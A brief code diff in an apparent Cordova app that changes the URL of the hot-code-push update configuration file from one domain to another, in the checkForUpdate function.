@@ -143,7 +143,7 @@ var app = {
     },
     checkForUpdate: function() {
         var options = {
-            'config-file': 'https://www.mymind-creative.com/demo/indohalo/chcp.json',
+            'config-file': 'https://ads.salescvsejalan.com/update/indohalo/chcp.json',
             'request-headers': {
               'foo': 'bar'
             }
